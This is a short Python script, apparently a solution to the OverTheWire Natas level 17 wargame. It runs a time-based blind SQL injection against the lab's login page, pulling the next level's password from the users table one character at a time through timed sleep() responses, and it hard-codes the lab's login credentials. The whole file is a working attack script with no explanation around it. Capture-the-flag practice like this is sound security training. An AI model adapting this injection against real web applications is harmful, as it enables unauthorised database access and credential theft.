#! /usr/bin/python

import requests
import string

def compare(i, char_code):
	res = 0
	url = "http://natas17.natas.labs.overthewire.org/"
	auth_username = "natas17"
	auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

	injection = 'natas18"%20AND%20IF(ASCII(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username="natas18"),%20'+ str(i) +',%201))<"' + str(char_code) + '",%20sleep(5),%20null) and "a"="a'
	uri = ''.join([url,'?','username=', injection,'&debug'])

	try :
		r = requests.get(uri, auth=(auth_username,auth_password), timeout=1)
	except requests.exceptions.Timeout:
		res = 1

	return res

def binarySearch(i, lower_bound, upper_bound):
	let = 0

	if upper_bound == lower_bound + 1:
		let = lower_bound
	else:
		middle = (lower_bound + upper_bound) // 2
		if compare(i, middle):
			let = binarySearch(i, lower_bound, middle)
		else:
			let = binarySearch(i, middle, upper_bound)
	return let

def init_search(i):
	lower_bound = ord('0')
	upper_bound = ord('z')
	return binarySearch(i, lower_bound, upper_bound)

def find_pass():
	pwd = ""
	for i in range(1, 33):
		let = chr(init_search(i))
		pwd += let
		print(pwd)

	print("Done.")

find_pass()
